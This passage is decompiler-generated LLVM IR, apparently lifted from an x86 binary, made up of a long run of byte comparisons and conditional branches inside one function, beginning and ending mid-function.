  %v3_804e5cb = load i8, i8* %v2_804e5cb, align 1
  %v4_804e5cb = icmp eq i8 %v3_804e5cb, 0
  %v1_804e5d0 = icmp eq i1 %v4_804e5cb, false
  br i1 %v1_804e5d0, label %dec_label_pc_804de41, label %dec_label_pc_804e5d6

dec_label_pc_804e5d6:                             ; preds = %dec_label_pc_804e5cb, %dec_label_pc_804e5b4
  %v1_804e5d6 = add i32 %v0_804e5c4, 52
  %v2_804e5d6 = inttoptr i32 %v1_804e5d6 to i8*
  %v3_804e5d6 = load i8, i8* %v2_804e5d6, align 1
  %v4_804e5d6 = icmp eq i8 %v3_804e5d6, 0
  br i1 %v4_804e5d6, label %dec_label_pc_804e5e6, label %dec_label_pc_804e5dd

dec_label_pc_804e5dd:                             ; preds = %dec_label_pc_804e5d6
  %v0_804e5dd = load i32, i32* @ebx, align 4
  %v1_804e5dd = trunc i32 %v0_804e5dd to i8
  %v11_804e5dd = icmp eq i8 %v1_804e5dd, -59
  br i1 %v11_804e5dd, label %dec_label_pc_804de41, label %dec_label_pc_804e5e6

dec_label_pc_804e5e6:                             ; preds = %dec_label_pc_804e5dd, %dec_label_pc_804e5d6
  %v1_804e5e6 = add i32 %v0_804e5c4, 69
  %v2_804e5e6 = inttoptr i32 %v1_804e5e6 to i8*
  %v3_804e5e6 = load i8, i8* %v2_804e5e6, align 1
  %v4_804e5e6 = icmp ne i8 %v3_804e5e6, 0
  %v1_804e5f2 = icmp eq i1 %v4_804e5d6, false
  %or.cond704 = and i1 %v4_804e5e6, %v1_804e5f2
  br i1 %or.cond704, label %dec_label_pc_804de41, label %dec_label_pc_804e5f8

dec_label_pc_804e5f8:                             ; preds = %dec_label_pc_804e5e6
  %v1_804e5f8 = add i32 %v0_804e5c4, 67
  %v2_804e5f8 = inttoptr i32 %v1_804e5f8 to i8*
  %v3_804e5f8 = load i8, i8* %v2_804e5f8, align 1
  %v4_804e5f8 = icmp eq i8 %v3_804e5f8, 0
  br i1 %v4_804e5f8, label %dec_label_pc_804e60a, label %dec_label_pc_804e5ff

dec_label_pc_804e5ff:                             ; preds = %dec_label_pc_804e5f8
  %v1_804e5ff = add i32 %v0_804e5c4, 51
  %v2_804e5ff = inttoptr i32 %v1_804e5ff to i8*
  %v3_804e5ff = load i8, i8* %v2_804e5ff, align 1
  %v4_804e5ff = icmp eq i8 %v3_804e5ff, 0
  %v1_804e604 = icmp eq i1 %v4_804e5ff, false
  br i1 %v1_804e604, label %dec_label_pc_804de41, label %dec_label_pc_804e60a

dec_label_pc_804e60a:                             ; preds = %dec_label_pc_804e5ff, %dec_label_pc_804e5f8
  %v1_804e60a = add i32 %v0_804e5c4, 86
  %v2_804e60a = inttoptr i32 %v1_804e60a to i8*
  %v3_804e60a = load i8, i8* %v2_804e60a, align 1
  %v0_804e61a.pre = load i32, i32* @ebx, align 4
  %v1_804e611 = trunc i32 %v0_804e61a.pre to i8
  %notlhs = icmp eq i8 %v3_804e60a, 0
  %notrhs = icmp ne i8 %v1_804e611, -71
  %or.cond237.not = or i1 %notlhs, %notrhs
  %v7_8050011 = icmp slt i8 %v4_804de51, 0
  %v1_8050013 = icmp eq i1 %v7_8050011, false
  %or.cond319 = or i1 %v1_8050013, %or.cond237.not
  %or.cond319.not = xor i1 %or.cond319, true
  %tmp747 = icmp ult i8 %v4_804de51, -65
  %or.cond321 = and i1 %tmp747, %or.cond319.not
  br i1 %or.cond321, label %dec_label_pc_804de41, label %dec_label_pc_804e61a

dec_label_pc_804e61a:                             ; preds = %dec_label_pc_804e60a
  %v10_804e61a = icmp eq i8 %v1_804e611, 47
  %v1_804e61d = zext i1 %v10_804e61a to i8
  %v3_804e61d = add i32 %v0_804e5c4, 38
  %v4_804e61d = inttoptr i32 %v3_804e61d to i8*
  store i8 %v1_804e61d, i8* %v4_804e61d, align 1
  %v0_804e622 = load i32, i32* @esp, align 4
  %v1_804e622 = add i32 %v0_804e622, 47
  %v2_804e622 = inttoptr i32 %v1_804e622 to i8*
  %v3_804e622 = load i8, i8* %v2_804e622, align 1
  %v4_804e622 = icmp eq i8 %v3_804e622, 0
  br i1 %v4_804e622, label %dec_label_pc_804e63e, label %dec_label_pc_804e629

dec_label_pc_804e629:                             ; preds = %dec_label_pc_804e61a
  %v1_804e629 = add i32 %v0_804e622, 38
  %v2_804e629 = inttoptr i32 %v1_804e629 to i8*
  %v3_804e629 = load i8, i8* %v2_804e629, align 1
  %notlhs490 = icmp ne i8 %v3_804e629, 0
  %v11_804e635 = icmp eq i8 %v4_804de51, 10
  %tmp748 = and i1 %v11_804e635, %notlhs490
  br i1 %tmp748, label %dec_label_pc_804de41, label %dec_label_pc_804e63e

dec_label_pc_804e63e:                             ; preds = %dec_label_pc_804e629, %dec_label_pc_804e61a
  %v0_804e63e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e63e = trunc i32 %v0_804e63e to i8
  %v11_804e63e = icmp eq i8 %v1_804e63e, -82
  br i1 %v11_804e63e, label %dec_label_pc_805006b, label %dec_label_pc_804e647

dec_label_pc_804e647:                             ; preds = %dec_label_pc_805006b, %dec_label_pc_804e63e
  %v1_804e647 = add i32 %v0_804e622, 87
  %v2_804e647 = inttoptr i32 %v1_804e647 to i8*
  %v3_804e647 = load i8, i8* %v2_804e647, align 1
  %v4_804e647 = icmp eq i8 %v3_804e647, 0
  br i1 %v4_804e647, label %dec_label_pc_804e657, label %dec_label_pc_804e64e

dec_label_pc_804e64e:                             ; preds = %dec_label_pc_804e647
  %v0_804e64e = load i32, i32* @ebx, align 4
  %v1_804e64e = trunc i32 %v0_804e64e to i8
  %v11_804e64e = icmp ne i8 %v1_804e64e, -15
  %or.cond323 = or i1 %v1_8050013, %v11_804e64e
  %or.cond323.not = xor i1 %or.cond323, true
  %v12_805002f = icmp eq i8 %v4_804de51, -1
  %v1_8050032 = icmp eq i1 %v12_805002f, false
  %or.cond325 = and i1 %v1_8050032, %or.cond323.not
  br i1 %or.cond325, label %dec_label_pc_804de41, label %dec_label_pc_804e657

dec_label_pc_804e657:                             ; preds = %dec_label_pc_804e64e, %dec_label_pc_804e647
  %v1_804e657 = add i32 %v0_804e622, 54
  %v2_804e657 = inttoptr i32 %v1_804e657 to i8*
  %v3_804e657 = load i8, i8* %v2_804e657, align 1
  %v4_804e657 = icmp eq i8 %v3_804e657, 0
  br i1 %v4_804e657, label %dec_label_pc_804e677, label %dec_label_pc_804e65e

dec_label_pc_804e65e:                             ; preds = %dec_label_pc_804e657
  %v0_804e65e = load i32, i32* @ebx, align 4
  %v1_804e65e = trunc i32 %v0_804e65e to i8
  %notlhs492 = icmp eq i8 %v1_804e65e, -57
  %v4_804de51.off494 = add i8 %v4_804de51, -64
  %tmp749 = icmp ult i8 %v4_804de51.off494, 63
  %tmp750 = and i1 %tmp749, %notlhs492
  br i1 %tmp750, label %dec_label_pc_804de41, label %dec_label_pc_804e667

dec_label_pc_804e667:                             ; preds = %dec_label_pc_804e65e
  %notlhs495 = icmp eq i8 %v1_804e65e, -45
  %v4_804de51.off497 = add i8 %v4_804de51, -96
  %tmp751 = icmp ult i8 %v4_804de51.off497, 31
  %tmp752 = and i1 %tmp751, %notlhs495
  br i1 %tmp752, label %dec_label_pc_804de41, label %dec_label_pc_804e677

dec_label_pc_804e677:                             ; preds = %dec_label_pc_804e667, %dec_label_pc_804e657
  %v1_804e677 = add i32 %v0_804e622, 83
  %v2_804e677 = inttoptr i32 %v1_804e677 to i8*
  %v3_804e677 = load i8, i8* %v2_804e677, align 1
  %v4_804e677 = icmp eq i8 %v3_804e677, 0
  br i1 %v4_804e677, label %dec_label_pc_804e693, label %dec_label_pc_804e67e

dec_label_pc_804e67e:                             ; preds = %dec_label_pc_804e677
  %v1_804e67e = add i32 %v0_804e622, 65
  %v2_804e67e = inttoptr i32 %v1_804e67e to i8*
  %v3_804e67e = load i8, i8* %v2_804e67e, align 1
  %notlhs498 = icmp ne i8 %v3_804e67e, 0
  %notrhs499 = icmp ugt i8 %v4_804de51, -65
  %or.cond241.not = and i1 %notrhs499, %notlhs498
  %v12_804e68a = icmp eq i8 %v4_804de51, -1
  %v1_804e68d = icmp eq i1 %v12_804e68a, false
  %or.cond242 = and i1 %v1_804e68d, %or.cond241.not
  br i1 %or.cond242, label %dec_label_pc_804de41, label %dec_label_pc_804e693

dec_label_pc_804e693:                             ; preds = %dec_label_pc_804e67e, %dec_label_pc_804e677
  %v10_804e693 = icmp eq i8 %v1_804e63e, 37
  %v1_804e696 = zext i1 %v10_804e693 to i8
  %v3_804e696 = add i32 %v0_804e622, 37
  %v4_804e696 = inttoptr i32 %v3_804e696 to i8*
  store i8 %v1_804e696, i8* %v4_804e696, align 1
  %v0_804e69b = load i32, i32* @esp, align 4
  %v1_804e69b = add i32 %v0_804e69b, 37
  %v2_804e69b = inttoptr i32 %v1_804e69b to i8*
  %v3_804e69b = load i8, i8* %v2_804e69b, align 1
  %v4_804e69b = icmp eq i8 %v3_804e69b, 0
  br i1 %v4_804e69b, label %dec_label_pc_804e6ab, label %dec_label_pc_804e6a2

dec_label_pc_804e6a2:                             ; preds = %dec_label_pc_804e693
  %v0_804e6a2 = load i32, i32* @ebx, align 4
  %v1_804e6a2 = trunc i32 %v0_804e6a2 to i8
  %notlhs500 = icmp eq i8 %v1_804e6a2, -117
  %v4_804de51.off502 = add i8 %v4_804de51, -1
  %tmp753 = icmp ult i8 %v4_804de51.off502, 30
  %tmp754 = and i1 %tmp753, %notlhs500
  br i1 %tmp754, label %dec_label_pc_804de41, label %dec_label_pc_804e6ab

dec_label_pc_804e6ab:                             ; preds = %dec_label_pc_804e6a2, %dec_label_pc_804e693
  %v0_804e6ab = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e6ab = trunc i32 %v0_804e6ab to i8
  %v10_804e6ab = icmp eq i8 %v1_804e6ab, 67
  %v1_804e6ae = zext i1 %v10_804e6ab to i32
  %v2_804e6ae = load i32, i32* %eax.global-to-local, align 4
  %v3_804e6ae = and i32 %v2_804e6ae, -256
  %v4_804e6ae = or i32 %v1_804e6ae, %v3_804e6ae
  store i32 %v4_804e6ae, i32* %eax.global-to-local, align 4
  %v4_804e6b1 = icmp eq i1 %v10_804e6ab, false
  br i1 %v4_804e6b1, label %dec_label_pc_804e6cb, label %dec_label_pc_804e6b5

dec_label_pc_804e6b5:                             ; preds = %dec_label_pc_804e6ab
  %v0_804e6b5 = load i32, i32* @ebx, align 4
  %v1_804e6b5 = trunc i32 %v0_804e6b5 to i8
  switch i8 %v1_804e6b5, label %dec_label_pc_804e6cb [
    i8 -49, label %dec_label_pc_80500b6
    i8 -51, label %dec_label_pc_80500a0
  ]

dec_label_pc_804e6cb:                             ; preds = %dec_label_pc_80500b6, %dec_label_pc_80500a0, %dec_label_pc_804e6b5, %dec_label_pc_804e6ab
  %v1_804e6cb = add i32 %v0_804e69b, 62
  %v2_804e6cb = inttoptr i32 %v1_804e6cb to i8*
  %v3_804e6cb = load i8, i8* %v2_804e6cb, align 1
  %v4_804e6cb = icmp eq i8 %v3_804e6cb, 0
  br i1 %v4_804e6cb, label %dec_label_pc_804e6db, label %dec_label_pc_804e6d2

dec_label_pc_804e6d2:                             ; preds = %dec_label_pc_804e6cb
  %v0_804e6d2 = load i32, i32* @ebx, align 4
  %v1_804e6d2 = trunc i32 %v0_804e6d2 to i8
  %v8_804e6d2 = icmp ne i8 %v1_804e6d2, -16
  %or.cond348 = or i1 %v1_8050013, %v8_804e6d2
  %or.cond348.not = xor i1 %or.cond348, true
  %tmp755 = icmp ult i8 %v4_804de51, -113
  %or.cond350 = and i1 %tmp755, %or.cond348.not
  br i1 %or.cond350, label %dec_label_pc_804de41, label %dec_label_pc_804e6db

dec_label_pc_804e6db:                             ; preds = %dec_label_pc_804e6d2, %dec_label_pc_804e6cb
  %v1_804e6db = add i32 %v0_804e69b, 79
  %v2_804e6db = inttoptr i32 %v1_804e6db to i8*
  %v3_804e6db = load i8, i8* %v2_804e6db, align 1
  %notlhs503 = icmp eq i8 %v3_804e6db, 0
  %notrhs504 = icmp ne i8 %v1_804e6ab, 82
  %or.cond243.not = or i1 %notrhs504, %notlhs503
  %v6_80500e3 = icmp eq i8 %v4_804de51, 0
  %or.cond351 = or i1 %v6_80500e3, %or.cond243.not
  %or.cond351.not = xor i1 %or.cond351, true
  %tmp756 = icmp ult i8 %v4_804de51, 15
  %or.cond353 = and i1 %tmp756, %or.cond351.not
  br i1 %or.cond353, label %dec_label_pc_804de41, label %dec_label_pc_804e6eb

dec_label_pc_804e6eb:                             ; preds = %dec_label_pc_804e6db
  %v1_804e6eb = add i32 %v0_804e69b, 68
  %v2_804e6eb = inttoptr i32 %v1_804e6eb to i8*
  %v3_804e6eb = load i8, i8* %v2_804e6eb, align 1
  %notlhs505 = icmp eq i8 %v3_804e6eb, 0
  %notrhs506 = icmp ne i8 %v1_804e6ab, 95
  %or.cond244.not = or i1 %notrhs506, %notlhs505
  %tmp757 = icmp ult i8 %v4_804de51, 8
  %or.cond387 = or i1 %tmp757, %or.cond244.not
  %or.cond387.not = xor i1 %or.cond387, true
  %tmp758 = icmp ult i8 %v4_804de51, 63
  %or.cond389 = and i1 %tmp758, %or.cond387.not
  br i1 %or.cond389, label %dec_label_pc_804de41, label %dec_label_pc_804e6fb

dec_label_pc_804e6fb:                             ; preds = %dec_label_pc_804e6eb
  %v0_804e6fb = load i32, i32* @ebx, align 4
  %v1_804e6fb = trunc i32 %v0_804e6fb to i8
  %v11_804e6fb = icmp eq i8 %v1_804e6fb, -19
  %v1_804e6fe = zext i1 %v11_804e6fb to i8
  %v3_804e6fe = add i32 %v0_804e69b, 36
  %v4_804e6fe = inttoptr i32 %v3_804e6fe to i8*
  store i8 %v1_804e6fe, i8* %v4_804e6fe, align 1
  %v0_804e703 = load i32, i32* @esp, align 4
  %v1_804e703 = add i32 %v0_804e703, 60
  %v2_804e703 = inttoptr i32 %v1_804e703 to i8*
  %v3_804e703 = load i8, i8* %v2_804e703, align 1
  %v4_804e703 = icmp eq i8 %v3_804e703, 0
  br i1 %v4_804e703, label %dec_label_pc_804e71f, label %dec_label_pc_804e70a

dec_label_pc_804e70a:                             ; preds = %dec_label_pc_804e6fb
  %v1_804e70a = add i32 %v0_804e703, 36
  %v2_804e70a = inttoptr i32 %v1_804e70a to i8*
  %v3_804e70a = load i8, i8* %v2_804e70a, align 1
  %notlhs507 = icmp ne i8 %v3_804e70a, 0
  %v4_804de51.off509 = add i8 %v4_804de51, -32
  %tmp759 = icmp ult i8 %v4_804de51.off509, 11
  %tmp760 = and i1 %tmp759, %notlhs507
  br i1 %tmp760, label %dec_label_pc_804de41, label %dec_label_pc_804e71f

dec_label_pc_804e71f:                             ; preds = %dec_label_pc_804e70a, %dec_label_pc_804e6fb
  %v0_804e71f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e71f = trunc i32 %v0_804e71f to i8
  %v11_804e71f = icmp eq i8 %v1_804e71f, -71
  %v1_804e722 = zext i1 %v11_804e71f to i32
  %v2_804e722 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e722 = and i32 %v2_804e722, -256
  %v4_804e722 = or i32 %v1_804e722, %v3_804e722
  store i32 %v4_804e722, i32* %eax.global-to-local, align 4
  %v4_804e725 = icmp eq i1 %v11_804e71f, false
  br i1 %v4_804e725, label %dec_label_pc_804e732, label %dec_label_pc_804e729

dec_label_pc_804e729:                             ; preds = %dec_label_pc_804e71f
  %v0_804e729 = load i32, i32* @ebx, align 4
  %v1_804e729 = trunc i32 %v0_804e729 to i8
  %notlhs510 = icmp eq i8 %v1_804e729, 92
  %v4_804de51.off512 = add i8 %v4_804de51, 36
  %tmp761 = icmp ult i8 %v4_804de51.off512, 3
  %tmp762 = and i1 %tmp761, %notlhs510
  br i1 %tmp762, label %dec_label_pc_804de41, label %dec_label_pc_804e732

dec_label_pc_804e732:                             ; preds = %dec_label_pc_804e729, %dec_label_pc_804e71f
  %v1_804e732 = add i32 %v0_804e703, 45
  %v2_804e732 = inttoptr i32 %v1_804e732 to i8*
  %v3_804e732 = load i8, i8* %v2_804e732, align 1
  %v4_804e732 = icmp eq i8 %v3_804e732, 0
  br i1 %v4_804e732, label %dec_label_pc_804e742, label %dec_label_pc_804e739

dec_label_pc_804e739:                             ; preds = %dec_label_pc_804e732
  %v0_804e739 = load i32, i32* @ebx, align 4
  %v1_804e739 = trunc i32 %v0_804e739 to i8
  %v11_804e739 = icmp ne i8 %v1_804e739, -18
  %or.cond395 = or i1 %v1_8050013, %v11_804e739
  %or.cond395.not = xor i1 %or.cond395, true
  %or.cond397 = and i1 %tmp747, %or.cond395.not
  br i1 %or.cond397, label %dec_label_pc_804de41, label %dec_label_pc_804e742

dec_label_pc_804e742:                             ; preds = %dec_label_pc_804e739, %dec_label_pc_804e732
  %v1_804e742 = add i32 %v0_804e703, 61
  %v2_804e742 = inttoptr i32 %v1_804e742 to i8*
  %v3_804e742 = load i8, i8* %v2_804e742, align 1
  %v4_804e742 = icmp eq i8 %v3_804e742, 0
  br i1 %v4_804e742, label %dec_label_pc_804e752, label %dec_label_pc_804e749

dec_label_pc_804e749:                             ; preds = %dec_label_pc_804e742
  %v0_804e749 = load i32, i32* @ebx, align 4
  %v1_804e749 = trunc i32 %v0_804e749 to i8
  %v11_804e749 = icmp ne i8 %v1_804e749, -34
  %or.cond398 = or i1 %v6_80500e3, %v11_804e749
  %or.cond398.not = xor i1 %or.cond398, true
  %tmp763 = icmp ult i8 %v4_804de51, 31
  %or.cond400 = and i1 %tmp763, %or.cond398.not
  br i1 %or.cond400, label %dec_label_pc_804de41, label %dec_label_pc_804e752

dec_label_pc_804e752:                             ; preds = %dec_label_pc_804e749, %dec_label_pc_804e742
  %v8_804e752 = icmp eq i8 %v1_804e71f, -48
  %v1_804e755 = zext i1 %v8_804e752 to i8
  %v3_804e755 = add i32 %v0_804e703, 35
  %v4_804e755 = inttoptr i32 %v3_804e755 to i8*
  store i8 %v1_804e755, i8* %v4_804e755, align 1
  %v0_804e75a = load i32, i32* @esp, align 4
  %v1_804e75a = add i32 %v0_804e75a, 35
  %v2_804e75a = inttoptr i32 %v1_804e75a to i8*
  %v3_804e75a = load i8, i8* %v2_804e75a, align 1
  %v4_804e75a = icmp eq i8 %v3_804e75a, 0
  br i1 %v4_804e75a, label %dec_label_pc_804e76a, label %dec_label_pc_804e761

dec_label_pc_804e761:                             ; preds = %dec_label_pc_804e752
  %v0_804e761 = load i32, i32* @ebx, align 4
  %v1_804e761 = trunc i32 %v0_804e761 to i8
  %notlhs513 = icmp eq i8 %v1_804e761, -89
  %v4_804de51.off515 = add i8 %v4_804de51, 24
  %tmp764 = icmp ult i8 %v4_804de51.off515, 20
  %tmp765 = and i1 %tmp764, %notlhs513
  br i1 %tmp765, label %dec_label_pc_804de41, label %dec_label_pc_804e76a

dec_label_pc_804e76a:                             ; preds = %dec_label_pc_804e761, %dec_label_pc_804e752
  %v0_804e76a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e76a = trunc i32 %v0_804e76a to i8
  %v10_804e76a = icmp eq i8 %v1_804e76a, 66
  %v1_804e76d = zext i1 %v10_804e76a to i8
  %v3_804e76d = add i32 %v0_804e75a, 34
  %v4_804e76d = inttoptr i32 %v3_804e76d to i8*
  store i8 %v1_804e76d, i8* %v4_804e76d, align 1
  %v0_804e772 = load i32, i32* @esp, align 4
  %v1_804e772 = add i32 %v0_804e772, 64
  %v2_804e772 = inttoptr i32 %v1_804e772 to i8*
  %v3_804e772 = load i8, i8* %v2_804e772, align 1
  %v4_804e772 = icmp eq i8 %v3_804e772, 0
  br i1 %v4_804e772, label %dec_label_pc_804e788, label %dec_label_pc_804e779

dec_label_pc_804e779:                             ; preds = %dec_label_pc_804e76a
  %v1_804e779 = add i32 %v0_804e772, 34
  %v2_804e779 = inttoptr i32 %v1_804e779 to i8*
  %v3_804e779 = load i8, i8* %v2_804e779, align 1
  %v4_804e779 = icmp ne i8 %v3_804e779, 0
  %or.cond247 = and i1 %v7_8050011, %v4_804e779
  %tmp766 = icmp ult i8 %v4_804de51, -97
  %or.cond406 = and i1 %tmp766, %or.cond247
  br i1 %or.cond406, label %dec_label_pc_804de41, label %dec_label_pc_804e788

dec_label_pc_804e788:                             ; preds = %dec_label_pc_804e779, %dec_label_pc_804e76a
  %v1_804e788 = add i32 %v0_804e772, 43
  %v2_804e788 = inttoptr i32 %v1_804e788 to i8*
  %v3_804e788 = load i8, i8* %v2_804e788, align 1
  %v4_804e788 = icmp eq i8 %v3_804e788, 0
  br i1 %v4_804e788, label %dec_label_pc_804e798, label %dec_label_pc_804e78f

dec_label_pc_804e78f:                             ; preds = %dec_label_pc_804e788
  %v0_804e78f = load i32, i32* @ebx, align 4
  %v1_804e78f = trunc i32 %v0_804e78f to i8
  %v10_804e78f = icmp ne i8 %v1_804e78f, 63
  %or.cond407 = or i1 %v6_80500e3, %v10_804e78f
  %or.cond407.not = xor i1 %or.cond407, true
  %tmp767 = icmp ult i8 %v4_804de51, 127
  %or.cond409 = and i1 %tmp767, %or.cond407.not
  br i1 %or.cond409, label %dec_label_pc_804de41, label %dec_label_pc_804e798

dec_label_pc_804e798:                             ; preds = %dec_label_pc_804e78f, %dec_label_pc_804e788
  %v1_804e798 = add i32 %v0_804e772, 36
  %v2_804e798 = inttoptr i32 %v1_804e798 to i8*
  %v3_804e798 = load i8, i8* %v2_804e798, align 1
  %v4_804e798 = icmp eq i8 %v3_804e798, 0
  br i1 %v4_804e798, label %dec_label_pc_804e7a8, label %dec_label_pc_804e79f

dec_label_pc_804e79f:                             ; preds = %dec_label_pc_804e798
  %v0_804e79f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e79f = trunc i32 %v0_804e79f to i8
  %v11_804e79f = icmp ne i8 %v1_804e79f, -40
  %or.cond411 = or i1 %v1_8050013, %v11_804e79f
  %or.cond411.not = xor i1 %or.cond411, true
  %tmp768 = icmp ult i8 %v4_804de51, -97
  %or.cond413 = and i1 %tmp768, %or.cond411.not
  br i1 %or.cond413, label %dec_label_pc_804de41, label %dec_label_pc_804e7a8

dec_label_pc_804e7a8:                             ; preds = %dec_label_pc_804e79f, %dec_label_pc_804e798
  %v0_804e7a8 = load i32, i32* @ebx, align 4
  %v1_804e7a8 = trunc i32 %v0_804e7a8 to i8
  %v10_804e7a8 = icmp eq i8 %v1_804e7a8, 61
  %v1_804e7ab = zext i1 %v10_804e7a8 to i8
  %v3_804e7ab = add i32 %v0_804e772, 33
  %v4_804e7ab = inttoptr i32 %v3_804e7ab to i8*
  store i8 %v1_804e7ab, i8* %v4_804e7ab, align 1
  %v0_804e7b0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e7b0 = trunc i32 %v0_804e7b0 to i8
  %v10_804e7b0 = icmp eq i8 %v1_804e7b0, 108
  %v0_805015e = load i32, i32* @esp, align 4
  br i1 %v10_804e7b0, label %dec_label_pc_805015e, label %dec_label_pc_804e7b9

dec_label_pc_804e7b9:                             ; preds = %dec_label_pc_804e7a8, %dec_label_pc_805015e
  %v1_804e7b9 = add i32 %v0_805015e, 43
  %v2_804e7b9 = inttoptr i32 %v1_804e7b9 to i8*
  %v3_804e7b9 = load i8, i8* %v2_804e7b9, align 1
  %v4_804e7b9 = icmp eq i8 %v3_804e7b9, 0
  br i1 %v4_804e7b9, label %dec_label_pc_804e7c9, label %dec_label_pc_804e7c0

dec_label_pc_804e7c0:                             ; preds = %dec_label_pc_804e7b9
  %v0_804e7c0 = load i32, i32* @ebx, align 4
  %v1_804e7c0 = trunc i32 %v0_804e7c0 to i8
  %v10_804e7c0 = icmp eq i8 %v1_804e7c0, 76
  br i1 %v10_804e7c0, label %dec_label_pc_804de41, label %dec_label_pc_804e7c9

dec_label_pc_804e7c9:                             ; preds = %dec_label_pc_804e7c0, %dec_label_pc_804e7b9
  %v0_804e7c9 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e7c9 = trunc i32 %v0_804e7c9 to i8
  %v4_804e7c9 = icmp eq i8 %v3_804e7c9, 0
  br i1 %v4_804e7c9, label %dec_label_pc_804e7d6, label %dec_label_pc_804e7cd

dec_label_pc_804e7cd:                             ; preds = %dec_label_pc_804e7c9
  %v0_804e7cd = load i32, i32* @ebx, align 4
  %v1_804e7cd = trunc i32 %v0_804e7cd to i8
  %notlhs516 = icmp eq i8 %v1_804e7cd, 11
  %tmp769 = and i8 %v4_804de51, -4
  %tmp770 = icmp eq i8 %tmp769, -112
  %tmp771 = and i1 %tmp770, %notlhs516
  br i1 %tmp771, label %dec_label_pc_804de41, label %dec_label_pc_804e7d6

dec_label_pc_804e7d6:                             ; preds = %dec_label_pc_804e7cd, %dec_label_pc_804e7c9
  %v1_804e7d6 = add i32 %v0_805015e, 63
  %v2_804e7d6 = inttoptr i32 %v1_804e7d6 to i8*
  %v3_804e7d6 = load i8, i8* %v2_804e7d6, align 1
  %v4_804e7d6 = icmp eq i8 %v3_804e7d6, 0
  br i1 %v4_804e7d6, label %dec_label_pc_804e7ef, label %dec_label_pc_804e7dd

dec_label_pc_804e7dd:                             ; preds = %dec_label_pc_804e7d6
  br i1 %v4_804e7c9, label %dec_label_pc_804e808, label %dec_label_pc_804e7e1

dec_label_pc_804e7e1:                             ; preds = %dec_label_pc_804e7dd
  %tmp772 = icmp ugt i8 %v4_804de51, 20
  %v4_804de51.off = add i8 %v4_804de51, -21
  %tmp773 = icmp ult i8 %v4_804de51.off, 2
  %or.cond249 = and i1 %tmp772, %tmp773
  br i1 %or.cond249, label %dec_label_pc_804de41, label %dec_label_pc_804e7f3

dec_label_pc_804e7ef:                             ; preds = %dec_label_pc_804e7d6
  br i1 %v4_804e7c9, label %dec_label_pc_804e808, label %dec_label_pc_804e7f3

dec_label_pc_804e7f3:                             ; preds = %dec_label_pc_804e7e1, %dec_label_pc_804e7ef
  %v1_804e7f3 = add i32 %v0_805015e, 33
  %v2_804e7f3 = inttoptr i32 %v1_804e7f3 to i8*
  %v3_804e7f3 = load i8, i8* %v2_804e7f3, align 1
  %notlhs519 = icmp ne i8 %v3_804e7f3, 0
  %v4_804de51.off521 = add i8 %v4_804de51, 120
  %tmp774 = icmp ult i8 %v4_804de51.off521, 3
  %tmp775 = and i1 %tmp774, %notlhs519
  br i1 %tmp775, label %dec_label_pc_804de41, label %dec_label_pc_804e808

dec_label_pc_804e808:                             ; preds = %dec_label_pc_804e7f3, %dec_label_pc_804e7ef, %dec_label_pc_804e7dd
  %v1_804e808 = add i32 %v0_805015e, 41
  %v2_804e808 = inttoptr i32 %v1_804e808 to i8*
  %v3_804e808 = load i8, i8* %v2_804e808, align 1
  %v4_804e808 = icmp eq i8 %v3_804e808, 0
  %brmerge = or i1 %v4_804e7c9, %v4_804e808
  %tmp776 = icmp ult i8 %v4_804de51, -69
  %or.cond252 = or i1 %tmp776, %brmerge
  %or.cond252.not = xor i1 %or.cond252, true
  %or.cond253 = and i1 %tmp747, %or.cond252.not
  br i1 %or.cond253, label %dec_label_pc_804de41, label %dec_label_pc_804e821

dec_label_pc_804e821:                             ; preds = %dec_label_pc_804e808
  %v1_804e821 = add i32 %v0_805015e, 34
  %v2_804e821 = inttoptr i32 %v1_804e821 to i8*
  %v3_804e821 = load i8, i8* %v2_804e821, align 1
  %v4_804e821 = icmp eq i8 %v3_804e821, 0
  br i1 %v4_804e821, label %dec_label_pc_804e841, label %dec_label_pc_804e828

dec_label_pc_804e828:                             ; preds = %dec_label_pc_804e821
  %v0_804e828 = load i32, i32* @ebx, align 4
  %v1_804e828 = trunc i32 %v0_804e828 to i8
  %notlhs522 = icmp eq i8 %v1_804e828, -106
  %v4_804de51.off524 = add i8 %v4_804de51, -120
  %tmp777 = icmp ult i8 %v4_804de51.off524, 95
  %tmp778 = and i1 %tmp777, %notlhs522
  br i1 %tmp778, label %dec_label_pc_804de41, label %dec_label_pc_804e831

dec_label_pc_804e831:                             ; preds = %dec_label_pc_804e828
  %notlhs525 = icmp eq i8 %v1_804e828, -105
  %notrhs526 = icmp ugt i8 %v4_804de51, -120
  %or.cond378.not = and i1 %notrhs526, %notlhs525
  %v4_804de51.off194 = add i8 %v4_804de51, 119
  %tmp779 = icmp ult i8 %v4_804de51.off194, 2
  %or.cond381 = and i1 %tmp779, %or.cond378.not
  br i1 %or.cond381, label %dec_label_pc_804de41, label %dec_label_pc_804e841

dec_label_pc_804e841:                             ; preds = %dec_label_pc_804e831, %dec_label_pc_804e821
  %v1_804e841 = add i32 %v0_805015e, 60
  %v2_804e841 = inttoptr i32 %v1_804e841 to i8*
  %v3_804e841 = load i8, i8* %v2_804e841, align 1
  %v4_804e841 = icmp eq i8 %v3_804e841, 0
  br i1 %v4_804e841, label %dec_label_pc_804e851, label %dec_label_pc_804e848

dec_label_pc_804e848:                             ; preds = %dec_label_pc_804e841
  %v0_804e848 = load i32, i32* @ebx, align 4
  %v1_804e848 = trunc i32 %v0_804e848 to i8
  %notlhs527 = icmp eq i8 %v1_804e848, 94
  %notrhs528 = icmp ugt i8 %v4_804de51, -20
  %or.cond360.not = and i1 %notrhs528, %notlhs527
  %v12_8050122 = icmp eq i8 %v4_804de51, -1
  %v1_8050125 = icmp eq i1 %v12_8050122, false
  %or.cond362 = and i1 %v1_8050125, %or.cond360.not
  br i1 %or.cond362, label %dec_label_pc_804de41, label %dec_label_pc_804e851

dec_label_pc_804e851:                             ; preds = %dec_label_pc_804e848, %dec_label_pc_804e841
  switch i8 %v1_804e7b0, label %dec_label_pc_804e863 [
    i8 63, label %dec_label_pc_80500f9
    i8 70, label %dec_label_pc_80502f1
  ]

dec_label_pc_804e863.thread:                      ; preds = %dec_label_pc_80502f1, %dec_label_pc_80500f9
